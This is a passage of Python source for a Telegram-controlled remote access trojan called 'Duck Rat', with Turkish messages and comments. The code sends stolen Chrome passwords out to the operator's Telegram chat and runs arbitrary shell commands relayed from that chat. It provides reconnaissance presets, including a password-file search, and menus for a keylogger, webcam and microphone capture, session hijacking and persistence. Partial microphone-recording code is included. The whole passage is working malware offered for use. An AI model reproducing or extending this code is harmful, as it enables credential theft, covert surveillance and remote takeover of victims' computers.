            
            if filename and os.path.exists(filename):
                # Dosyayı gönder
                with open(filename, "rb") as f:
                    await context.bot.send_document(
                        chat_id=update.effective_chat.id, 
                        document=f,
                        caption=f"🔐 **{len(passwords)} şifre bulundu!**\n\n📍 Kaynak: Chrome Şifre Yöneticisi\n🌐 chrome://password-manager/passwords"
                    )
                
                # Dosyayı sil
                os.remove(filename)
                await context.bot.send_message(
                    chat_id=update.effective_chat.id, 
                    text="✅ Şifre dosyası gönderildi ve silindi."
                )
            else:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id, 
                    text="❌ Şifre dosyası oluşturulamadı."
                )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="❌ Hiç şifre bulunamadı."
            )
            
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text=f"Şifre çalma sırasında hata: {e}"
        )

# Chrome bypass komutu
@authorized_only
async def bypass_passwords(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not BROWSER_PASSWORDS_AVAILABLE:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="❌ Chrome bypass modülü yüklenemedi!"
        )
        return
    
    try:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="🔓 Chrome bypass başlatılıyor... Bu işlem biraz zaman alabilir."
        )
        
        # Bypass işlemini başlat
        passwords = simple_password_steal()
        
        if passwords:
            # Şifreleri dosyaya kaydet
            filename = save_simple_results(passwords, "bypass_passwords.txt")
            
            if filename and os.path.exists(filename):
                # Dosyayı gönder
                with open(filename, "rb") as f:
                    await context.bot.send_document(
                        chat_id=update.effective_chat.id, 
                        document=f,
                        caption=f"🔓 **{len(passwords)} şifre bypass edildi!**\n\n📍 Kaynak: Chrome Bypass\n🌐 chrome://password-manager/passwords"
                    )
                
                # Dosyayı sil
                os.remove(filename)
                await context.bot.send_message(
                    chat_id=update.effective_chat.id, 
                    text="✅ Bypass dosyası gönderildi ve silindi."
                )
            else:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id, 
                    text="❌ Bypass dosyası oluşturulamadı."
                )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="❌ Hiç şifre bypass edilemedi. Chrome'un güvenlik önlemi çok güçlü."
            )
            
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text=f"Bypass sırasında hata: {e}"
        )

# Shell komut çalıştırma - ESKİ HALİ
@authorized_only
async def shell_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not SHELL_EXECUTOR_AVAILABLE:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="❌ Shell executor modülü yüklenemedi!"
        )
        return
    
    try:
        # Komut argümanını al
        command = ' '.join(context.args)
        if not command:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="❌ Kullanım: /shell <komut>\nÖrnek: /shell dir\nÖrnek: /shell whoami\nÖrnek: /shell ipconfig"
            )
            return
        
        # Global shell executor'ı başlat
        global shell_executor
        if shell_executor is None:
            shell_executor = ShellExecutor()
        
        # Komutu çalıştır
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text=f"🔧 Komut çalıştırılıyor: `{command}`"
        )
        
        result = shell_executor.execute_command(command)
        
        # Sonucu gönder (uzunsa böl)
        if len(result) > 4000:
            # Uzun sonuçları böl
            parts = [result[i:i+4000] for i in range(0, len(result), 4000)]
            for i, part in enumerate(parts, 1):
                await context.bot.send_message(
                    chat_id=update.effective_chat.id, 
                    text=f"📤 **Sonuç {i}/{len(parts)}:**\n{part}"
                )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"📤 **Sonuç:**\n{result}"
            )
            
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text=f"Shell komut hatası: {e}"
        )

# Shell bilgi komutu
@authorized_only
async def shell_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not SHELL_EXECUTOR_AVAILABLE:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="❌ Shell executor modülü yüklenemedi!"
        )
        return
    
    try:
        global shell_executor
        if shell_executor is None:
            shell_executor = ShellExecutor()
        
        info = shell_executor.get_system_info()
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text=f"🖥️ **Shell Bilgileri:**\n\n{info}"
        )
        
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text=f"Shell bilgi hatası: {e}"
        )

# Shell geçmişi komutu
@authorized_only
async def shell_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not SHELL_EXECUTOR_AVAILABLE:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="❌ Shell executor modülü yüklenemedi!"
        )
        return
    
    try:
        global shell_executor
        if shell_executor is None:
            shell_executor = ShellExecutor()
        
        history = shell_executor._show_history()
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text=history
        )
        
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text=f"Shell geçmiş hatası: {e}"
        )

# Shell komutları listesi - ESKİ HALİ
@authorized_only
async def shell_commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shell komut menüsünü gösterir"""
    try:
        # Ana menü butonları
        keyboard = [
            [
                InlineKeyboardButton("💻 Direkt Shell Komutu", callback_data="shell_direct"),
                InlineKeyboardButton("📋 Hazır Komutlar", callback_data="shell_ready")
            ],
            [
                InlineKeyboardButton("📁 Dosya İşlemleri", callback_data="shell_files"),
                InlineKeyboardButton("🖥️ Sistem Bilgileri", callback_data="shell_system")
            ],
            [
                InlineKeyboardButton("🌐 Ağ Komutları", callback_data="shell_network"),
                InlineKeyboardButton("⚙️ Süreç Yönetimi", callback_data="shell_process")
            ],
            [
                InlineKeyboardButton("🔍 Bilgi Toplama", callback_data="shell_info"),
                InlineKeyboardButton("🔧 Gelişmiş", callback_data="shell_advanced")
            ],
            [
                InlineKeyboardButton("📊 Sistem Analizi", callback_data="shell_analysis"),
                InlineKeyboardButton("🎯 Özel Komutlar", callback_data="shell_special")
            ]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="🔧 **SHELL KOMUT MENÜSÜ**\n\nSeçenek:",
            reply_markup=reply_markup
        )
        
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text=f"Komut listesi hatası: {e}"
        )

# Shell komut callback handler - ESKİ HALİ
@authorized_only
async def shell_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shell komut butonlarının callback'lerini işler"""
    query = update.callback_query
    await query.answer()
    
    try:
        data = query.data
        
        if data == "shell_direct":
            # Direkt shell komut girişi
            keyboard = [
                [
                    InlineKeyboardButton("🔙 Geri", callback_data="shell_back")
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                text="💻 **DİREKT SHELL KOMUTU**\n\nKomut girmek için:\n`/shell <komut>`\n\nÖrnekler:\n• `/shell dir`\n• `/shell whoami`\n• `/shell ipconfig`\n• `/shell systeminfo`\n• `/shell tasklist`\n\n💡 **İpucu:** Herhangi bir Windows CMD komutunu kullanabilirsiniz!",
                reply_markup=reply_markup
            )
            return
            
        elif data == "shell_ready":
            # Hazır komutlar menüsü
            keyboard = [
                [
                    InlineKeyboardButton("📁 Dosya İşlemleri", callback_data="shell_files"),
                    InlineKeyboardButton("🖥️ Sistem Bilgileri", callback_data="shell_system")
                ],
                [
                    InlineKeyboardButton("🌐 Ağ Komutları", callback_data="shell_network"),
                    InlineKeyboardButton("⚙️ Süreç Yönetimi", callback_data="shell_process")
                ],
                [
                    InlineKeyboardButton("🔍 Bilgi Toplama", callback_data="shell_info"),
                    InlineKeyboardButton("🔧 Gelişmiş", callback_data="shell_advanced")
                ],
                [
                    InlineKeyboardButton("📊 Sistem Analizi", callback_data="shell_analysis"),
                    InlineKeyboardButton("🎯 Özel Komutlar", callback_data="shell_special")
                ],
                [
                    InlineKeyboardButton("🔙 Geri", callback_data="shell_back")
                ]
            ]
            text = "📋 **HAZIR KOMUTLAR**\n\nKategori seçin:"
            
        elif data == "shell_files":
            keyboard = [
                [
                    InlineKeyboardButton("📂 Dizin Listesi", callback_data="cmd_dir"),
                    InlineKeyboardButton("📁 Dizin Değiştir", callback_data="cmd_cd")
                ],
                [
                    InlineKeyboardButton("📋 Dosya Kopyala", callback_data="cmd_copy"),
                    InlineKeyboardButton("🗑️ Dosya Sil", callback_data="cmd_del")
                ],
                [
                    InlineKeyboardButton("📁 Klasör Oluştur", callback_data="cmd_mkdir"),
                    InlineKeyboardButton("📄 Dosya Oku", callback_data="cmd_type")
                ],
                [
                    InlineKeyboardButton("🔍 Dosya Ara", callback_data="cmd_find"),
                    InlineKeyboardButton("🔙 Geri", callback_data="shell_back")
                ]
            ]
            text = "📁 **DOSYA İŞLEMLERİ**\n\nKomut seçin:"
            
        elif data == "shell_system":
            keyboard = [
                [
                    InlineKeyboardButton("🖥️ Sistem Bilgileri", callback_data="cmd_systeminfo"),
                    InlineKeyboardButton("👤 Kullanıcı Bilgisi", callback_data="cmd_whoami")
                ],
                [
                    InlineKeyboardButton("🖥️ Bilgisayar Adı", callback_data="cmd_hostname"),
                    InlineKeyboardButton("📋 Windows Versiyonu", callback_data="cmd_ver")
                ],
                [
                    InlineKeyboardButton("📅 Tarih", callback_data="cmd_date"),
                    InlineKeyboardButton("🕐 Saat", callback_data="cmd_time")
                ],
                [
                    InlineKeyboardButton("🔙 Geri", callback_data="shell_back")
                ]
            ]
            text = "🖥️ **SİSTEM BİLGİLERİ**\n\nKomut seçin:"
            
        elif data == "shell_network":
            keyboard = [
                [
                    InlineKeyboardButton("🌐 IP Bilgileri", callback_data="cmd_ipconfig"),
                    InlineKeyboardButton("📊 Detaylı IP", callback_data="cmd_ipconfig_all")
                ],
                [
                    InlineKeyboardButton("🔗 Ağ Bağlantıları", callback_data="cmd_netstat"),
                    InlineKeyboardButton("🏓 Ping Testi", callback_data="cmd_ping")
                ],
                [
                    InlineKeyboardButton("📋 ARP Tablosu", callback_data="cmd_arp"),
                    InlineKeyboardButton("🛣️ Yönlendirme", callback_data="cmd_route")
                ],
                [
                    InlineKeyboardButton("🔙 Geri", callback_data="shell_back")
                ]
            ]
            text = "🌐 **AĞ KOMUTLARI**\n\nKomut seçin:"
            
        elif data == "shell_process":
            keyboard = [
                [
                    InlineKeyboardButton("📋 Çalışan Süreçler", callback_data="cmd_tasklist"),
                    InlineKeyboardButton("❌ Süreç Sonlandır", callback_data="cmd_taskkill")
                ],
                [
                    InlineKeyboardButton("📊 Detaylı Süreçler", callback_data="cmd_wmic_process"),
                    InlineKeyboardButton("⚙️ Servis Listesi", callback_data="cmd_wmic_service")
                ],
                [
                    InlineKeyboardButton("🔙 Geri", callback_data="shell_back")
                ]
            ]
            text = "⚙️ **SÜREÇ YÖNETİMİ**\n\nKomut seçin:"
            
        elif data == "shell_info":
            keyboard = [
                [
                    InlineKeyboardButton("🖥️ Bilgisayar Bilgileri", callback_data="cmd_wmic_computer"),
                    InlineKeyboardButton("🔧 BIOS Bilgileri", callback_data="cmd_wmic_bios")
                ],
                [
                    InlineKeyboardButton("💾 Disk Bilgileri", callback_data="cmd_wmic_disk"),
                    InlineKeyboardButton("🧠 RAM Bilgileri", callback_data="cmd_wmic_memory")
                ],
                [
                    InlineKeyboardButton("👥 Kullanıcı Hesapları", callback_data="cmd_wmic_users"),
                    InlineKeyboardButton("🔙 Geri", callback_data="shell_back")
                ]
            ]
            text = "🔍 **BİLGİ TOPLAMA**\n\nKomut seçin:"
            
        elif data == "shell_advanced":
            keyboard = [
                [
                    InlineKeyboardButton("🗂️ Registry Sorgula", callback_data="cmd_reg_query"),
                    InlineKeyboardButton("🚀 Başlangıç Programları", callback_data="cmd_wmic_startup")
                ],
                [
                    InlineKeyboardButton("🔍 Şifre Dosyaları Ara", callback_data="cmd_findstr_password"),
                    InlineKeyboardButton("🌐 Ağ Bilgisayarları", callback_data="cmd_net_view")
                ],
                [
                    InlineKeyboardButton("🔍 DNS Sorgusu", callback_data="cmd_nslookup"),
                    InlineKeyboardButton("🔙 Geri", callback_data="shell_back")
                ]
            ]
            text = "🔧 **GELİŞMİŞ KOMUTLAR**\n\nKomut seçin:"
            
        elif data == "shell_analysis":
            keyboard = [
                [
                    InlineKeyboardButton("🌳 Süreç Ağacı", callback_data="cmd_wmic_process_tree"),
                    InlineKeyboardButton("💾 Disk Kullanımı", callback_data="cmd_wmic_disk_usage")
                ],
                [
                    InlineKeyboardButton("🖥️ CPU Bilgileri", callback_data="cmd_wmic_cpu"),
                    InlineKeyboardButton("🧠 RAM Kullanımı", callback_data="cmd_wmic_ram_usage")
                ],
                [
                    InlineKeyboardButton("🔙 Geri", callback_data="shell_back")
                ]
            ]
            text = "📊 **SİSTEM ANALİZİ**\n\nKomut seçin:"
            
        elif data == "shell_special":
            keyboard = [
                [
                    InlineKeyboardButton("💬 Test Mesajı", callback_data="cmd_echo"),
                    InlineKeyboardButton("🧹 Ekranı Temizle", callback_data="cmd_cls")
                ],
                [
                    InlineKeyboardButton("❓ CMD Yardımı", callback_data="cmd_help"),
                    InlineKeyboardButton("🚪 Çıkış", callback_data="cmd_exit")
                ],
                [
                    InlineKeyboardButton("🔙 Geri", callback_data="shell_back")
                ]
            ]
            text = "🎯 **ÖZEL KOMUTLAR**\n\nKomut seçin:"
            
        elif data == "shell_back":
            # Ana menüye dön
            keyboard = [
                [
                    InlineKeyboardButton("💻 Direkt Shell Komutu", callback_data="shell_direct"),
                    InlineKeyboardButton("📋 Hazır Komutlar", callback_data="shell_ready")
                ],
                [
                    InlineKeyboardButton("📁 Dosya İşlemleri", callback_data="shell_files"),
                    InlineKeyboardButton("🖥️ Sistem Bilgileri", callback_data="shell_system")
                ],
                [
                    InlineKeyboardButton("🌐 Ağ Komutları", callback_data="shell_network"),
                    InlineKeyboardButton("⚙️ Süreç Yönetimi", callback_data="shell_process")
                ],
                [
                    InlineKeyboardButton("🔍 Bilgi Toplama", callback_data="shell_info"),
                    InlineKeyboardButton("🔧 Gelişmiş", callback_data="shell_advanced")
                ],
                [
                    InlineKeyboardButton("📊 Sistem Analizi", callback_data="shell_analysis"),
                    InlineKeyboardButton("🎯 Özel Komutlar", callback_data="shell_special")
                ]
            ]
            text = "🔧 **SHELL KOMUT MENÜSÜ**\n\nSeçenek:"
            
        else:
            # Komut çalıştır
            await execute_shell_command_from_button(query, context, data)
            return
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text=text, reply_markup=reply_markup)
        
    except Exception as e:
        await query.edit_message_text(text=f"Callback hatası: {e}")

# Butonlardan gelen komutları çalıştır
async def execute_shell_command_from_button(query, context, command_data):
    """Butonlardan gelen komutları çalıştırır"""
    try:
        # Global shell executor'ı başlat
        global shell_executor
        if shell_executor is None:
            shell_executor = ShellExecutor()
        
        # Komut eşleştirmeleri
        command_map = {
            "cmd_dir": "dir",
            "cmd_cd": "cd C:\\Users",
            "cmd_copy": "copy",
            "cmd_del": "del",
            "cmd_mkdir": "mkdir",
            "cmd_type": "type",
            "cmd_find": "dir /s *.txt",
            "cmd_systeminfo": "systeminfo",
            "cmd_whoami": "whoami",
            "cmd_hostname": "hostname",
            "cmd_ver": "ver",
            "cmd_date": "date",
            "cmd_time": "time",
            "cmd_ipconfig": "ipconfig",
            "cmd_ipconfig_all": "ipconfig /all",
            "cmd_netstat": "netstat -an",
            "cmd_ping": "ping google.com",
            "cmd_arp": "arp -a",
            "cmd_route": "route print",
            "cmd_tasklist": "tasklist",
            "cmd_taskkill": "taskkill /f /im notepad.exe",
            "cmd_wmic_process": "wmic process list",
            "cmd_wmic_service": "wmic service list",
            "cmd_wmic_computer": "wmic computersystem get name,manufacturer,model",
            "cmd_wmic_bios": "wmic bios get serialnumber,version",
            "cmd_wmic_disk": "wmic diskdrive get model,size",
            "cmd_wmic_memory": "wmic memorychip get capacity",
            "cmd_wmic_users": "wmic useraccount get name,disabled",
            "cmd_reg_query": 'reg query "HKEY_LOCAL_MACHINE\\SOFTWARE"',
            "cmd_wmic_startup": "wmic startup get name,command",
            "cmd_findstr_password": 'findstr /s "password" *.txt',
            "cmd_net_view": "net view",
            "cmd_nslookup": "nslookup google.com",
            "cmd_wmic_process_tree": "wmic process get name,processid,parentprocessid",
            "cmd_wmic_disk_usage": "wmic logicaldisk get size,freespace,caption",
            "cmd_wmic_cpu": "wmic cpu get name,numberofcores,numberoflogicalprocessors",
            "cmd_wmic_ram_usage": "wmic os get totalvisiblememorysize,freephysicalmemory",
            "cmd_echo": "echo Merhaba Dünya",
            "cmd_cls": "cls",
            "cmd_help": "help",
            "cmd_exit": "exit"
        }
        
        command = command_map.get(command_data)
        if not command:
            await query.edit_message_text(text="❌ Bilinmeyen komut!")
            return
        
        # Komutu çalıştır
        await query.edit_message_text(text=f"🔧 Komut çalıştırılıyor: `{command}`")
        
        result = shell_executor.execute_command(command)
        
        # Sonucu gönder (uzunsa böl)
        if len(result) > 4000:
            parts = [result[i:i+4000] for i in range(0, len(result), 4000)]
            for i, part in enumerate(parts, 1):
                if i == 1:
                    await query.edit_message_text(text=f"📤 **Sonuç {i}/{len(parts)}:**\n{part}")
                else:
                    await context.bot.send_message(
                        chat_id=query.message.chat_id,
                        text=f"📤 **Sonuç {i}/{len(parts)}:**\n{part}"
                    )
        else:
            await query.edit_message_text(text=f"📤 **Sonuç:**\n{result}")
            
    except Exception as e:
        await query.edit_message_text(text=f"Komut çalıştırma hatası: {e}")

# Basit /start komutu
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Bot başlatma komutu"""
    user_id = update.effective_user.id
    
    # Yetki kontrolü
    if user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ RAT'tan yetkiniz yok!")
        return
    
    # GIF'li menü göster
    await send_duck_rat_message_with_gif(update, context)


async def send_duck_rat_message_with_gif(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Duck Rat mesajını GIF ile gönderir"""
    try:
        # GIF constant'ını kullan
        if GIF_AVAILABLE and DUCK_GIF_BASE64:
            print("✅ GIF constant kullanılıyor")
            gif_base64 = DUCK_GIF_BASE64
        else:
            print("❌ GIF constant bulunamadı, normal mesaj gönderiliyor")
            await show_single_computer_menu(update, context)
            return
        
        if gif_base64 and len(gif_base64) > 100:
            # Base64'ü bytes'a çevir
            gif_data = base64.b64decode(gif_base64)
            
            # Geçici GIF dosyası oluştur
            temp_gif_path = "temp_duck.gif"
            with open(temp_gif_path, 'wb') as f:
                f.write(gif_data)
            
            # Mesaj metni
            status_message = f"""
🦆 Duck Rat 🦆

⚠️ HEDEF BİLGİSİ ⚠️

• Sistem: {get_computer_name()}
• IP Adresi: {get_local_ip()}

——————————————————————

• ✅ Hizmet Durumu: Aktif
• 🔐 Erişim ve Kayıt: Denetim Altında

Aşağıdan yönetebilirsiniz:
"""
            
            # TÜM RAT KOMUTLARI BUTON HALİNDE
            keyboard = [
                # Görsel İzleme
                [
                    InlineKeyboardButton("📸 Ekran Yakalama", callback_data="rat_screenshot"),
                    InlineKeyboardButton("📷 Kamera Erişimi", callback_data="rat_camera")
                ],
                [
                    InlineKeyboardButton("🎥 Video Kayıt Aç/Kapat", callback_data="rat_video"),
                    InlineKeyboardButton("🎙️ Mikrofon Kayıt", callback_data="rat_microphone")
                ],
                
                # Giriş İzleme
                [
                    InlineKeyboardButton("📝 Tuş Vuruşu Logları", callback_data="rat_log"),
                    InlineKeyboardButton("▶️ Keylogger Başlat", callback_data="rat_start_keylogger")
                ],
                [
                    InlineKeyboardButton("⏹️ Keylogger Durdur", callback_data="rat_stop_keylogger")
                ],
                
                # Sistem İstihbaratı
                [
                    InlineKeyboardButton("🖥️ Sistem Bilgileri", callback_data="rat_system_info"),
                    InlineKeyboardButton("⚙️ Çalışan Süreçler", callback_data="rat_processes")
                ],
                [
                    InlineKeyboardButton("📁 Dizin Listesi", callback_data="rat_files"),
                    InlineKeyboardButton("📥 Dosya/Klasör Çek", callback_data="rat_download")
                ],
                
                # Kimlik Bilgisi Toplama
                [
                    InlineKeyboardButton("🔐 Chrome Şifreleri Çal", callback_data="rat_passwords"),
                    InlineKeyboardButton("🔓 Chrome Güvenlik Bypass", callback_data="rat_bypass")
                ],
                
                # Komut Yürütme
                [
                    InlineKeyboardButton("💻 Shell Komut Menüsü", callback_data="rat_shell"),
                    InlineKeyboardButton("📊 Shell Bilgileri", callback_data="rat_shellinfo")
                ],
                [
                    InlineKeyboardButton("📋 Komut Geçmişi", callback_data="rat_shellhistory"),
                    InlineKeyboardButton("🔓 Session Hijacking", callback_data="rat_session_hijack")
                ],
                
                # Sistem Yönetimi
                [
                    InlineKeyboardButton("🖥️ Sistemi Kapat", callback_data="rat_shutdown"),
                    InlineKeyboardButton("🔄 Sistemi Yeniden Başlat", callback_data="rat_restart")
                ],
                [
                    InlineKeyboardButton("🧹 Geçici Dosyaları Temizle", callback_data="rat_cleanup"),
                    InlineKeyboardButton("🔧 Persistence Durumu", callback_data="rat_persistence")
                ]
            ]
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            # GIF ile mesaj gönder
            try:
                with open(temp_gif_path, 'rb') as gif_file:
                    await context.bot.send_animation(
                        chat_id=update.effective_chat.id,
                        animation=gif_file,
                        caption=status_message,
                        reply_markup=reply_markup
                    )
                print("✅ GIF başarıyla gönderildi")
            except Exception as e:
                print(f"❌ GIF gönderme hatası: {e}")
                # GIF gönderilemezse normal mesaj gönder
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=status_message,
                    reply_markup=reply_markup
                )
            
            # Geçici dosyayı sil
            try:
                os.remove(temp_gif_path)
            except:
                pass
            
        else:
            # GIF dosyası yoksa normal mesaj gönder
            await show_single_computer_menu(update, context)
        
    except Exception as e:
        print(f"GIF gönderme hatası: {e}")
        # GIF gönderilemezse normal mesaj gönder
        await show_single_computer_menu(update, context)

async def show_single_computer_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ana menüyü göster"""
    try:
        # TÜM RAT KOMUTLARI BUTON HALİNDE - TÜRKÇE + YENİ ÖZELLİKLER
        keyboard = [
            # Görsel İzleme
            [
                InlineKeyboardButton("📸 Ekran Yakalama", callback_data="rat_screenshot"),
                InlineKeyboardButton("📷 Kamera Erişimi", callback_data="rat_camera")
            ],
            [
                InlineKeyboardButton("🎥 Video Kayıt Aç/Kapat", callback_data="rat_video"),
                InlineKeyboardButton("🎙️ Mikrofon Kayıt", callback_data="rat_microphone")
            ],
            
            # Giriş İzleme
            [
                InlineKeyboardButton("📝 Tuş Vuruşu Logları", callback_data="rat_log"),
                InlineKeyboardButton("▶️ Keylogger Başlat", callback_data="rat_start_keylogger")
            ],
            [
                InlineKeyboardButton("⏹️ Keylogger Durdur", callback_data="rat_stop_keylogger")
            ],
            
            # Sistem İstihbaratı
            [
                InlineKeyboardButton("🖥️ Sistem Bilgileri", callback_data="rat_system_info"),
                InlineKeyboardButton("⚙️ Çalışan Süreçler", callback_data="rat_processes")
            ],
            [
                InlineKeyboardButton("📁 Dizin Listesi", callback_data="rat_files"),
                InlineKeyboardButton("📥 Dosya/Klasör Çek", callback_data="rat_download")
            ],
            
            # Kimlik Bilgisi Toplama
            [
                InlineKeyboardButton("🔐 Chrome Şifreleri Çal", callback_data="rat_passwords"),
                InlineKeyboardButton("🔓 Chrome Güvenlik Bypass", callback_data="rat_bypass")
            ],
            
            # Komut Yürütme
            [
                InlineKeyboardButton("💻 Shell Komut Menüsü", callback_data="rat_shell"),
                InlineKeyboardButton("📊 Shell Bilgileri", callback_data="rat_shellinfo")
            ],
            [
                InlineKeyboardButton("📋 Komut Geçmişi", callback_data="rat_shellhistory"),
                InlineKeyboardButton("🔓 Session Hijacking", callback_data="rat_session_hijack")
            ],
            
            # Sistem Yönetimi
            [
                InlineKeyboardButton("🖥️ Sistemi Kapat", callback_data="rat_shutdown"),
                InlineKeyboardButton("🔄 Sistemi Yeniden Başlat", callback_data="rat_restart")
            ],
            [
                InlineKeyboardButton("🧹 Geçici Dosyaları Temizle", callback_data="rat_cleanup"),
                InlineKeyboardButton("🔧 Persistence Durumu", callback_data="rat_persistence")
            ]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        status_message = f"""
🦆 Duck Rat 🦆

⚠️ HEDEF BİLGİSİ ⚠️

• Sistem: {get_computer_name()}
• IP Adresi: {get_local_ip()}

——————————————————————

• ✅ Hizmet Durumu: Aktif
• 🔐 Erişim ve Kayıt: Denetim Altında

Aşağıdan yönetebilirsiniz:
"""
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text=status_message,
            reply_markup=reply_markup
        )
        
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text=f"Start komut hatası: {e}"
        )


# RAT komut callback handler
@authorized_only
async def rat_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """RAT komut butonlarının callback'lerini işler"""
    query = update.callback_query
    await query.answer()
    
    try:
        data = query.data
        
        if data == "rat_screenshot":
            await ekran_goruntusu(update, context)
        elif data == "rat_video":
            # Video kayıt durumuna göre başlat veya durdur
            if video_recording:
                await stop_video(update, context)
                # Video kaydı durdurulduktan sonra video dosyasını gönder
                await send_video(update, context)
            else:
                await start_video(update, context)
        elif data == "rat_camera":
            await kamera(update, context)
        elif data == "rat_log":
            await send_log(update, context)
        elif data == "rat_start_keylogger":
            await start_keylogger_cmd(update, context)
        elif data == "rat_stop_keylogger":
            await stop_keylogger_cmd(update, context)
        elif data == "rat_system_info":
            await system_info(update, context)
        elif data == "rat_processes":
            await processes(update, context)
        elif data == "rat_files":
            await list_files(update, context)
        elif data == "rat_passwords":
            await steal_passwords(update, context)
        elif data == "rat_bypass":
            await bypass_passwords(update, context)
        elif data == "rat_shell":
            await shell_commands(update, context)
        elif data == "rat_shutdown":
            await shutdown(update, context)
        elif data == "rat_restart":
            await restart(update, context)
        elif data == "rat_cleanup":
            await cleanup(update, context)
        elif data == "rat_persistence":
            await check_persistence(update, context)
        elif data == "rat_shellinfo":
            await shell_info(update, context)
        elif data == "rat_shellhistory":
            await shell_history(update, context)
        elif data == "rat_microphone":
            await microphone_record(update, context)
        elif data == "rat_download":
            await download_file_menu(update, context)
        elif data == "rat_session_hijack":
            await session_hijacking(update, context)
        else:
            await query.edit_message_text(text="❌ Bilinmeyen komut!")
        
    except Exception as e:
        await query.edit_message_text(text=f"RAT callback hatası: {e}")


# Mikrofon kayıt fonksiyonu
async def microphone_record(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mikrofon kayıt özelliği"""
    # Yetki kontrolü
    if update.effective_user.id not in ALLOWED_USERS:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Yetkiniz yok!")
        return
    
    try:
        # Kullanıcıdan süre iste
        keyboard = [
            [
                InlineKeyboardButton("5 Saniye", callback_data="mic_5"),
                InlineKeyboardButton("10 Saniye", callback_data="mic_10")
            ],
            [
                InlineKeyboardButton("30 Saniye", callback_data="mic_30"),
                InlineKeyboardButton("60 Saniye", callback_data="mic_60")
            ],
            [
                InlineKeyboardButton("🔙 Geri", callback_data="back_to_main")
            ]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="🎙️ **MİKROFON KAYIT**\n\nKayıt süresini seçin:",
            reply_markup=reply_markup
        )
        
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"Mikrofon menü hatası: {e}"
        )

# Mikrofon kayıt callback handler
async def microphone_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mikrofon kayıt callback'lerini işler"""
    # Yetki kontrolü
    if update.effective_user.id not in ALLOWED_USERS:
        try:
            await update.callback_query.answer("❌ Yetkiniz yok!")
        except:
            pass
        return
    
    query = update.callback_query
    
    try:
        await query.answer()
    except Exception:
        # Query çok eski, devam et
        pass
    
    try:
        data = query.data
        
        if data == "mic_5":
            await start_microphone_recording(update, context, 5)
        elif data == "mic_10":
            await start_microphone_recording(update, context, 10)
        elif data == "mic_30":
            await start_microphone_recording(update, context, 30)
        elif data == "mic_60":
            await start_microphone_recording(update, context, 60)
        elif data == "back_to_main":
            await start(update, context)
        
    except Exception as e:
        try:
            await query.edit_message_text(text=f"Mikrofon callback hatası: {e}")
        except:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"Mikrofon callback hatası: {e}"
            )

# Mikrofon kayıt başlatma
async def start_microphone_recording(update: Update, context: ContextTypes.DEFAULT_TYPE, duration: int):
    """Mikrofon kaydını başlatır"""
    # Yetki kontrolü
    if update.effective_user.id not in ALLOWED_USERS:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Yetkiniz yok!")
        return
    
    try:
        import pyaudio
        import wave
        import threading
        import time
        
        # Kayıt parametreleri
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        RECORD_SECONDS = duration
        
        # Ses dosyası adı
        filename = f"microphone_recording_{int(time.time())}.wav"
        
        # Kullanıcıya bilgi ver
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"🎙️ **Mikrofon Kaydı Başlatılıyor...**\n\n⏱️ Süre: {duration} saniye\n📁 Dosya: {filename}"
        )
        
        # PyAudio nesnesi oluştur
        audio = pyaudio.PyAudio()
        
        # Kayıt stream'i aç
        stream = audio.open(format=FORMAT,
                          channels=CHANNELS,
                          rate=RATE,
                          input=True,
                          frames_per_buffer=CHUNK)
        
        frames = []
        
        # Kayıt başlat
        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
